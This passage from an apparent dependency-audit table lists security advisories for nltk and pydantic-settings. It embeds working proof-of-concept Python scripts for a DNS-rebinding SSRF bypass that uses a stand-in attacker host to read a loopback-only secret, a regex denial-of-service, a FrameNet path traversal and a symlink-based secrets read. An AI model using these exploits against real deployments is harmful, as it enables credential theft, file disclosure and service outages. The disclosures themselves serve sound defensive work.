                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               |
| nltk              | [PYSEC-2026-597](https://osv.dev/vulnerability/PYSEC-2026-597)           | [CVE-2026-12243](https://www.cve.org/CVERecord?id=CVE-2026-12243)                                                                           | 3.9.4     |                | <span title="NLTK version 3.9.4 is vulnerable to a path traversal attack due to an incomplete fix for GitHub Issue #3504. The `_UNSAFE_NO_PROTOCOL_RE` regex in `nltk/data.py` checks for literal `../` sequences but fails to account for percent-encoded traversal sequences such as `..%2f`. The `url2pathname()` function decodes these sequences after the validation step, allowing an attacker to bypass the protection. This vulnerability enables an attacker to read arbitrary files accessible to the Python process by controlling the resource name parameter passed to `nltk.data.load()` or `nltk.data.find()`. The issue affects applications that rely on NLTK for resource loading, including NLP web applications, Jupyter notebooks, and CLI tools. The default `pathsec.ENFORCE=False` setting exacerbates the impact by not blocking the file read at the `open()` stage.">NLTK version 3.9.4 is vulnerable to a path traversal attack due to an incomplete...</span>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 |
| nltk              | [CVE-2026-12075](https://www.cve.org/CVERecord?id=CVE-2026-12075)        | [GHSA-qvv7-cg9c-w4x3](https://github.com/advisories/GHSA-qvv7-cg9c-w4x3)                                                                    | 3.9.4     | 3.10.0         | <span title="### Summary `nltk.pathsec` provides an SSRF filter that NLTK documents as a security control, blocking loopback, private, link-local, and multicast ranges (including obfuscated forms) and recommending strict `ENFORCE` mode for security-sensitive environments. The filter is bypassable by DNS rebinding: `validate_network_url()` resolves the hostname and checks the resulting IP, but the actual HTTP connection re-resolves the hostname independently at connect time and connects to that second result. The validated IP is never the one connected to. An attacker controlling DNS for a hostname (a TTL-0 rebinding record) returns a public IP for the validation lookup and an internal/loopback IP for the connection lookup, defeating the filter even under `nltk.pathsec.ENFORCE = True`.   ### Details `urlopen()` validates, then hands the raw hostname to `urllib`, which performs a second name resolution deep in the connection layer (`http.client.HTTPConnection.connect` → `socket.create_connection` → `socket.getaddrinfo`). The validation-side and connection-side resolutions are fully independent code paths with independent caches:  1. `validate_network_url()` calls `_resolve_hostname(parsed.hostname)` and checks each returned IP against loopback/link-local/multicast/private, blocking under `ENFORCE`. (Resolution #1.) 2. `urlopen()` then calls `build_opener(...).open(url)` with the original URL (raw hostname), so `urllib` resolves the hostname again at connect time. (Resolution #2 — the address actually connected to.)  `_resolve_hostname` is decorated with `lru_cache` and its docstring claims to mitigate DNS rebinding, but the cache only memoizes the validation-side lookup. The connection layer&#x27;s `getaddrinfo` does not consult that cache, so it provides no protection. The annotation is a false assurance: an operator reading it may believe rebinding is handled when it is not.   ### PoC ```python import socket import threading import warnings from collections import defaultdict from http.server import BaseHTTPRequestHandler, HTTPServer  warnings.filterwarnings(&quot;ignore&quot;)  import nltk import nltk.pathsec as ps  ps.ENFORCE = True  # the documented strict SSRF sandbox  ATTACKER_HOST = &quot;rebind.attacker.test&quot;   # attacker-controlled authoritative DNS PUBLIC_IP = &quot;93.184.216.34&quot;              # public address served for the validation lookup SECRET = b&quot;TOP-SECRET-LOOPBACK-ONLY-METADATA-CREDENTIALS&quot;   # --- A loopback-only &quot;internal service&quot; (stands in for 169.254.169.254 / admin UI) --- class _Handler(BaseHTTPRequestHandler):     def do_GET(self):         self.send_response(200)         self.send_header(&quot;Content-Type&quot;, &quot;text/plain&quot;)         self.send_header(&quot;Content-Length&quot;, str(len(SECRET)))         self.end_headers()         self.wfile.write(SECRET)      def log_message(self, *a):         pass   def start_internal_server():     srv = HTTPServer((&quot;127.0.0.1&quot;, 0), _Handler)     threading.Thread(target=srv.serve_forever, daemon=True).start()     return srv.server_address[1]  # ephemeral port   # --- Model the TTL-0 rebinding record at the resolver layer --- _real_getaddrinfo = socket.getaddrinfo _lookups = defaultdict(int)   def _rebinding_getaddrinfo(host, port, *args, **kwargs):     if host == ATTACKER_HOST:         n = _lookups[host]         _lookups[host] += 1         ip = PUBLIC_IP if n == 0 else &quot;127.0.0.1&quot;   # 1st=public (validate), then loopback (connect)         p = port if isinstance(port, int) else 0         kind = &quot;VALIDATION -&gt; public&quot; if n == 0 else &quot;CONNECT    -&gt; loopback&quot;         print(f&quot;    [dns] getaddrinfo({host!r}) lookup #{n}: {kind} ({ip})&quot;)         return [(socket.AF_INET, socket.SOCK_STREAM, socket.IPPROTO_TCP, &quot;&quot;, (ip, p))]     return _real_getaddrinfo(host, port, *args, **kwargs)   def fetch(url):     with ps.urlopen(url, timeout=5) as r:         return r.read()   def main():     print(&quot;=&quot; * 62)     print(f&quot; NLTK pathsec DNS-rebinding SSRF bypass PoC&quot;)     print(f&quot; nltk {nltk.__version__}   |   nltk.pathsec.ENFORCE = {ps.ENFORCE}&quot;)     print(&quot;=&quot; * 62)      port = start_internal_server()     print(f&quot;[*] internal loopback service: http://127.0.0.1:{port}/  (returns secret)\n&quot;)      socket.getaddrinfo = _rebinding_getaddrinfo     ps._resolve_hostname.cache_clear()  # fresh validation cache, as on a real process     try:         # ---- Control: a DIRECT loopback URL must be blocked by the filter ----         print(&quot;[1] CONTROL: direct loopback URL (filter must block this)&quot;)         direct = f&quot;http://127.0.0.1:{port}/&quot;         try:             fetch(direct)             print(f&quot;    [?] unexpected: {direct} was NOT blocked\n&quot;)             control_ok = False         except PermissionError as e:             print(f&quot;    [OK] blocked -&gt; PermissionError: {e}\n&quot;)             control_ok = True          # ---- Attack: rebinding hostname bypasses the same filter ----         print(&quot;[2] ATTACK: rebinding hostname (public at validate, loopback at connect)&quot;)         evil = f&quot;http://{ATTACKER_HOST}:{port}/&quot;         print(f&quot;    fetching {evil}&quot;)         try:             body = fetch(evil)             leaked = SECRET in body             print(f&quot;    body returned to caller: {body!r}&quot;)             if leaked:                 print(&quot;\n  [VULN] loopback-only secret exfiltrated through pathsec.urlopen&quot;)                 print(f&quot;         validated IP = {PUBLIC_IP} (public)  but  connected IP = 127.0.0.1&quot;)                 print(f&quot;         non-blind SSRF despite ENFORCE = {ps.ENFORCE}&quot;)                 verdict = &quot;VULNERABLE&quot;             else:                 print(&quot;\n  [?] fetch succeeded but secret marker not present&quot;)                 verdict = &quot;INCONCLUSIVE&quot;         except PermissionError as e:             # Patched build: validate against the connect-time IP (or pin/resolve-once).             print(f&quot;\n  [SAFE] blocked -&gt; PermissionError: {e}&quot;)             verdict = &quot;NOT VULNERABLE&quot;     finally:         socket.getaddrinfo = _real_getaddrinfo      print(&quot;\n&quot; + &quot;=&quot; * 62)     print(f&quot; Control (direct loopback blocked): {control_ok}&quot;)     print(f&quot; Result: {verdict}   (ENFORCE = {ps.ENFORCE})&quot;)     print(&quot;=&quot; * 62)   if __name__ == &quot;__main__&quot;:     main() ```  ### Impact - **Full-response (non-blind) SSRF.** Because the fetched body is returned to the caller (e.g. `nltk.data.load` with `format=&quot;raw&quot;`), an attacker can read responses from internal-only HTTP services, loopback admin interfaces, and — most seriously — the cloud instance metadata service, which on major cloud providers can expose IAM/service credentials and lead to cloud account compromise. - **Bypass of an explicit security control.** It defeats the `nltk.pathsec` SSRF filter, including the `ENFORCE` mode that NLTK&#x27;s documentation recommends precisely for environments where untrusted input may reach NLTK. Deployments that adopted that boundary are not actually protected, and the `lru_cache` annotation claiming to mitigate rebinding makes the false assurance worse.">### Summary `nltk.pathsec` provides an SSRF filter that NLTK documents as a secu...</span> |
| nltk              | [CVE-2026-12061](https://www.cve.org/CVERecord?id=CVE-2026-12061)        | [GHSA-fg7f-2386-8897](https://github.com/advisories/GHSA-fg7f-2386-8897)                                                                    | 3.9.4     | 3.10.0         | <span title="### Summary `ReviewsCorpusReader` extracts feature annotations of the form *label* followed by a bracketed signed digit (e.g. a label then `[+2]`) from each review line, using the module-level `FEATURES` regex. The feature-label sub-pattern is unbounded — an optional greedy run of word-plus-whitespace groups followed by another word, which must then be followed by a literal `[`. On a long bracket-less line the label can match from every search position to the end of the line, causing quadratic backtracking. A single crafted line in a reviews corpus hangs `reviews()`, `features()`, and `sents()`.    ### Details The label alternative is a greedy, unanchored run of word-plus-whitespace groups followed by a word, which must then be followed by a literal `[`. On an input that is a long sequence of word-plus-whitespace with no bracket, at each of the *n* starting positions the engine greedily extends the label to the end of the line, only then fails to find the bracket, and backtracks the whole way. `re.findall` repeats this from every position, giving O(n²) total work. There is no exponential blow-up, but quadratic growth on an attacker-controlled line length is enough to hang the reader: a single line of ~100,000 words consumes CPU for tens of seconds to minutes.  ### PoC ``` import multiprocessing as mp import re import time  # --- The vulnerable regex, verbatim from nltk/corpus/reader/reviews.py L70-71 --- FEATURES_VULN = re.compile(r&quot;((?:(?:\w+\s)+)?\w+)\[((?:\+|\-)\d)\]&quot;)  # --- Bounded variant from the fix (PR #3583): cap the per-label word run. #     A generous bound (real feature labels are short noun phrases) makes the #     run linear while never affecting legitimate corpora. --- WORD_BOUND = 50 FEATURES_FIXED = re.compile(     r&quot;((?:(?:\w+\s){0,%d})?\w+)\[((?:\+|\-)\d)\]&quot; % WORD_BOUND )  TIMEOUT = 20.0  # seconds, per measurement SIZES = [1000, 2000, 4000, 8000, 16000]  # words on a single bracket-less line   def _bad_line(n_words):     &quot;&quot;&quot;A long line of plain words with NO trailing bracketed annotation.&quot;&quot;&quot;     return (&quot;word &quot; * n_words).rstrip()   def _worker(pattern_str, line, q):     pat = re.compile(pattern_str)     t0 = time.perf_counter()     pat.findall(line)     q.put(time.perf_counter() - t0)   def timed_findall(pattern, line, timeout=TIMEOUT):     &quot;&quot;&quot;Run pattern.findall(line) in a killable process; return seconds or None (timeout).&quot;&quot;&quot;     q = mp.Queue()     p = mp.Process(target=_worker, args=(pattern.pattern, line, q))     p.start()     p.join(timeout)     if p.is_alive():         p.terminate()         p.join()         return None     return q.get() if not q.empty() else None   def bench(label, pattern):     print(f&quot;\n[{label}]  pattern: {pattern.pattern}&quot;)     print(f&quot;  {&#x27;words&#x27;:&gt;7} {&#x27;~bytes&#x27;:&gt;8}   {&#x27;time&#x27;:&gt;12}   {&#x27;x prev&#x27;:&gt;7}&quot;)     prev = None     for n in SIZES:         line = _bad_line(n)         t = timed_findall(pattern, line)         if t is None:             print(f&quot;  {n:&gt;7} {len(line):&gt;8}   {&#x27;&gt;%.0fs TIMEOUT&#x27; % TIMEOUT:&gt;12}   {&#x27;--&#x27;:&gt;7}&quot;)             prev = None         else:             ratio = f&quot;{t/prev:.1f}x&quot; if prev else &quot;--&quot;             print(f&quot;  {n:&gt;7} {len(line):&gt;8}   {t*1000:&gt;9.1f} ms   {ratio:&gt;7}&quot;)             prev = t   def parity_check():     &quot;&quot;&quot;The bound must NOT change extraction on a realistic annotated line.&quot;&quot;&quot;     real = (         &quot;the picture quality[+2] and battery life[+1] are great but &quot;         &quot;the lens cap[-1] feels cheap and the menu system[-2] is slow&quot;     )     a = FEATURES_VULN.findall(real)     b = FEATURES_FIXED.findall(real)     print(&quot;\n[parity] realistic annotated line — extraction must be identical&quot;)     print(f&quot;  vulnerable regex -&gt; {a}&quot;)     print(f&quot;  bounded   regex  -&gt; {b}&quot;)     print(f&quot;  identical: {a == b}&quot;)     return a == b   def main():     print(&quot;=&quot; * 66)     print(&quot; NLTK ReviewsCorpusReader FEATURES ReDoS PoC (quadratic backtracking)&quot;)     print(&quot;=&quot; * 66)     print(f&quot; per-call timeout = {TIMEOUT:.0f}s   word bound (fix) = {WORD_BOUND}&quot;)      bench(&quot;VULNERABLE  reviews.py L70-71&quot;, FEATURES_VULN)     bench(&quot;BOUNDED     fix #3583&quot;, FEATURES_FIXED)     same = parity_check()      print(&quot;\n&quot; + &quot;=&quot; * 66)     print(&quot; Vulnerable: ~4x time per input doubling  =&gt; O(n^2) quadratic ReDoS&quot;)     print(&quot; Bounded:    ~2x time per input doubling  =&gt; O(n)   linear, stays in ms&quot;)     print(f&quot; Extraction parity on real annotations preserved: {same}&quot;)     print(&quot; A single ~100k-word bracket-less review line hangs reviews()/features()/sents().&quot;)     print(&quot;=&quot; * 66)   if __name__ == &quot;__main__&quot;:     main() ```  ### Impact Denial of service. Processing a single crafted line through `ReviewsCorpusReader` consumes CPU quadratically in the line length, hanging the calling thread or process. An application that loads an untrusted or user-supplied reviews corpus (multi-tenant pipelines, services that accept user-provided corpora, batch or CI jobs) can be stalled by one malicious line, with no authentication and no privileges required.">### Summary `ReviewsCorpusReader` extracts feature annotations of the form *labe...</span>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     |
| nltk              | [CVE-2026-12074](https://www.cve.org/CVERecord?id=CVE-2026-12074)        | [GHSA-xh95-f55m-82fw](https://github.com/advisories/GHSA-xh95-f55m-82fw)                                                                    | 3.9.4     | 3.10.0         | <span title="### Summary `FramenetCorpusReader.frame(name)` interpolates a caller-supplied frame name into an XML file path that is read with the builtin `open()`, bypassing `CorpusReader.open()` and the `nltk.pathsec` sandbox — including strict `ENFORCE=True` mode. A `../` sequence in the name escapes the corpus root, yielding an arbitrary XML file read whose parsed content is returned to the caller.   ### Details `frame_by_name` builds the path by joining the corpus root, the frame directory, and the caller-supplied name with a fixed `.xml` extension, with no containment check, then constructs an `XMLCorpusView` from that **string** path. Because the view is built from a string rather than a `PathPointer`, it reads with the builtin `open()`, so `nltk.pathsec.validate_path()` is never invoked and `ENFORCE=True` does not block the access. This is the same path-traversal class previously hardened for the generic corpus readers; `frame_by_name` never goes through `CorpusReader.open()`, so that protection does not apply.  The same string-path-into-`XMLCorpusView` pattern exists in two sibling methods that take a name from corpus data rather than the immediate caller: - `doc()` — uses the index entry `filename` field - the lexical-unit file loader — uses the `lexUnit` ID attribute  These are reachable through a malicious or attacker-modified FrameNet corpus index.  ### PoC ```python &quot;&quot;&quot;  import os import sys import tempfile import warnings from pathlib import Path  warnings.filterwarnings(&quot;ignore&quot;)  # --- Turn the documented strict sandbox ON, before importing the reader. --- import nltk.pathsec as ps ps.ENFORCE = True  import nltk from nltk.corpus.reader.framenet import FramenetCorpusReader, FramenetError  FRAME_XML = (     &#x27;&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;\n&#x27;     &#x27;&lt;frame xmlns=&quot;http://framenet.icsi.berkeley.edu&quot; ID=&quot;1337&quot; name=&quot;pwned&quot;&gt;\n&#x27;     &quot;&lt;definition&gt;SECRET-OUT-OF-ROOT-CONTENT&lt;/definition&gt;\n&quot;     &quot;&lt;/frame&gt;\n&quot; )  BANNER = &quot;&quot;&quot;\ ===========================================================  NLTK FramenetCorpusReader.frame() Path Traversal PoC  nltk {ver}   |   nltk.pathsec.ENFORCE = {enforce} ===========================================================&quot;&quot;&quot;.format(     ver=nltk.__version__, enforce=ps.ENFORCE )   def build_corpus():     &quot;&quot;&quot;Minimal valid FrameNet corpus + a frame-shaped secret OUTSIDE its root.&quot;&quot;&quot;     base = Path(tempfile.mkdtemp(prefix=&quot;fn_poc_&quot;))     root = base / &quot;corpora&quot; / &quot;framenet&quot;     for d in (&quot;frame&quot;, &quot;fulltext&quot;, &quot;lu&quot;):         (root / d).mkdir(parents=True)     (root / &quot;frameIndex.xml&quot;).write_text(         &#x27;&lt;?xml version=&quot;1.0&quot;?&gt;&lt;frameIndex&gt;&lt;/frameIndex&gt;&#x27;     )     (root / &quot;frRelation.xml&quot;).write_text(         &#x27;&lt;?xml version=&quot;1.0&quot;?&gt;&lt;frameRelations&gt;&lt;/frameRelations&gt;&#x27;     )      # A frame-shaped XML file OUTSIDE the corpus root (the &quot;sensitive&quot; target).     secret = base / &quot;private&quot;     secret.mkdir()     (secret / &quot;secret.xml&quot;).write_text(FRAME_XML)      return base, root, secret / &quot;secret.xml&quot;   def main():     print(BANNER)     base, root, secret_path = build_corpus()     print(f&quot;[*] corpus root : {root}&quot;)     print(f&quot;[*] secret file : {secret_path}  (OUTSIDE the root)\n&quot;)      fn = FramenetCorpusReader(str(root), [])      # Attacker-controlled frame name climbs out of &lt;root&gt;/frame/ up to &lt;base&gt;/private/secret.xml     evil = os.path.join(&quot;..&quot;, &quot;..&quot;, &quot;..&quot;, &quot;private&quot;, &quot;secret&quot;)     print(f&quot;[*] calling   fn.frame({evil!r})&quot;)      try:         f = fn.frame(evil)         definition = f[&quot;definition&quot;]         if &quot;SECRET-OUT-OF-ROOT-CONTENT&quot; in definition:             print(&quot;\n  [VULN] out-of-root file was read and returned to caller&quot;)             print(f&quot;         frame name : {evil}&quot;)             print(f&quot;         frame ID   : {f[&#x27;ID&#x27;]}   name: {f[&#x27;name&#x27;]}&quot;)             print(f&quot;         definition : {definition}&quot;)             print(f&quot;\n  -&gt; nltk.pathsec sandbox bypassed despite ENFORCE = {ps.ENFORCE}&quot;)             verdict = &quot;VULNERABLE&quot;         else:             print(f&quot;\n  [?] frame() returned but content unexpected: {definition!r}&quot;)             verdict = &quot;INCONCLUSIVE&quot;     except FramenetError as e:         # Patched build (#3581): _reject_unsafe_path_component raises before open().         print(f&quot;\n  [SAFE] FramenetError: {e}&quot;)         print(&quot;         traversal rejected before any file was opened (patched)&quot;)         verdict = &quot;NOT VULNERABLE&quot;     except Exception as e:         print(f&quot;\n  [SAFE] {type(e).__name__}: {e}&quot;)         verdict = &quot;NOT VULNERABLE&quot;      # Control: a plain absent name must fail as &#x27;Unknown frame&#x27;, NOT as a read.     print(&quot;\n[CONTROL] benign absent name should be &#x27;Unknown frame&#x27;:&quot;)     try:         fn.frame(&quot;Definitely_Not_A_Frame&quot;)         print(&quot;  [?] unexpectedly succeeded&quot;)     except Exception as e:         print(f&quot;  ok -&gt; {type(e).__name__}: {e}&quot;)      print(&quot;\n&quot; + &quot;=&quot; * 59)     print(f&quot; Result: {verdict}  (ENFORCE = {ps.ENFORCE})&quot;)     print(&quot;=&quot; * 59)   if __name__ == &quot;__main__&quot;:     main()  ```   ### Impact - **Out-of-sandbox arbitrary XML read.** Any application that routes attacker-influenced input into `frame()` can be made to read XML files from directories outside the intended corpus root and have their parsed content returned. `frame()` is a primary public API designed to accept a caller-specified frame name, so this is a natural exposure for any service exposing FrameNet lookups to user input. - **Broad read primitive.** Only a fixed `.xml` extension is appended; the attacker controls both directory and basename, giving &quot;read any XML file the process can read.&quot; Full content disclosure requires frame-shaped XML; other files yield a distinguishable parse error that acts as a file-existence/readability oracle for arbitrary paths. - **Silent bypass of an advertised boundary.** NLTK&#x27;s `SECURITY.md` presents the `nltk.pathsec` sandbox and `ENFORCE=True` as a hard boundary for web apps, multi-tenant pipelines, and CI/CD. Because `frame_by_name` builds the path itself and reads through a string-path `XMLCorpusView`, the containment guard is never called and `ENFORCE=True` does not block the read — silently, with no error or warning. - **Crafted-corpus reach.** Via `doc()` and the lexical-unit loader, a malicious FrameNet data directory drives the same traversal with no caller-supplied name. - **Sensitive targets.** Depending on deployment, readable out-of-root XML can include application configuration, data exports, and on-disk credentials stored as XML; the oracle behavior also allows filesystem mapping. Where `frame()` output is reflected to the requester, disclosure is direct and non-blind.">### Summary `FramenetCorpusReader.frame(name)` interpolates a caller-supplied fr...</span>            |
| pydantic-settings | [GHSA-4xgf-cpjx-pc3j](https://github.com/advisories/GHSA-4xgf-cpjx-pc3j) |                                                                                                                                             | 2.13.1    | 2.14.2         | <span title="### Summary  `NestedSecretsSettingsSource` reads secret values from files in a configured `secrets_dir`. When `secrets_nested_subdir=True`, a directory entry inside `secrets_dir` that is a symbolic link pointing **outside** `secrets_dir` is followed, so files outside the configured directory are read into settings values. The same code path bypasses the documented `secrets_dir_max_size` protection. An attacker or lower-privileged component able to influence entries in the configured secrets directory (for example, a writable or shared secrets mount) can turn this into an unintended local file read into settings and can defeat the advertised loading-size cap. This report does not claim network reachability by itself.  ### Details  `NestedSecretsSettingsSource` performed two passes over `secrets_dir` using two different, inconsistent directory-traversal implementations:  * The size check in `validate_secrets_path()` used `Path.glob(&#x27;**/*&#x27;)`, which does **not** descend into a symbolically-linked directory. * The loader in `load_secrets()` used `glob.iglob(f&#x27;{path}/**/*&#x27;, recursive=True)` followed by `read_text()`, which **does** follow symlinked directories and reads through the link target.  Because the two passes disagreed on symlinks, a symlinked directory inside `secrets_dir` whose target lives elsewhere was invisible to the size accounting (counted as 0 bytes) while still being fully read by the loader. This produces two distinct problems:  1. **Out-of-tree read (CWE-22 / CWE-59).** A symlinked directory (or file) inside `secrets_dir` that resolves outside it is followed, and the external file&#x27;s contents are loaded into the corresponding settings field. 2. **`secrets_dir_max_size` bypass (CWE-400).** The size check never sees the out-of-tree content, so the documented size cap is neither respected nor able to reject the oversized external file. A related amplification exists for cyclic in-tree symlinks, which `glob.iglob(recursive=True)` re-traverses, inflating the size accounting and the number of loaded secrets.  #### Reproduction  In a clean Linux container, with a `secrets_dir` containing a symlink `secrets/db -&gt; /path/outside` and an `outside/passwd` file of 512 bytes, while `secrets_dir_max_size=100`:  ```python from pydantic import BaseModel from pydantic_settings import (     BaseSettings,     SettingsConfigDict,     NestedSecretsSettingsSource, )   class Db(BaseModel):     passwd: str | None = None   class Settings(BaseSettings):     model_config = SettingsConfigDict(         secrets_dir=&#x27;secrets&#x27;,         secrets_nested_subdir=True,         secrets_dir_max_size=100,  # outside/passwd is 512 bytes     )     db: Db = Db()      @classmethod     def settings_customise_sources(         cls, settings_cls, init_settings, env_settings, dotenv_settings, file_secret_settings     ):         return (NestedSecretsSettingsSource(file_secret_settings),) ```  On affected versions, `Settings().db.passwd` is populated with the 512-byte out-of-tree file and **no** `SettingsError` is raised, even though the file exceeds `secrets_dir_max_size`.  ### Impact  Applications that opt into `NestedSecretsSettingsSource` with `secrets_nested_subdir=True` and load secrets from a directory whose entries can be influenced by an attacker or a lower-privileged component (for example, a writable or shared secrets mount, or a secrets directory partially populated from untrusted input) are affected. The impact is:  * **Confidentiality:** files outside the configured `secrets_dir` can be read into settings values (local file read). * **Integrity / availability of the safeguard:** the advertised `secrets_dir_max_size` cap can be bypassed, and cyclic symlinks can inflate resource usage during loading.  The vulnerability requires the ability to place a symbolic link inside the configured secrets directory; it is not remotely reachable on its own. Applications that do not use `NestedSecretsSettingsSource`, or that point `secrets_dir` at a directory fully under the application&#x27;s control, are not affected.  ### Mitigation  Upgrade to **pydantic-settings 2.14.2**, which:  * walks the secrets directory explicitly and only descends into directories whose resolved path stays within `secrets_dir`, so symlinked directories pointing outside are never followed; * uses a single, cycle-safe iterator for both the size check and the loader, so the size accounting and the loaded set are always consistent and each real directory is visited at most once; * skips any file whose resolved path escapes `secrets_dir`, as defense in depth.  If upgrading is not immediately possible, ensure the configured `secrets_dir` is fully owned and controlled by the application (no writable or attacker-influenced entries), or avoid `secrets_nested_subdir=True`.">### Summary  `NestedSecretsSettingsSource` reads secret values from files in a c...</span>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       |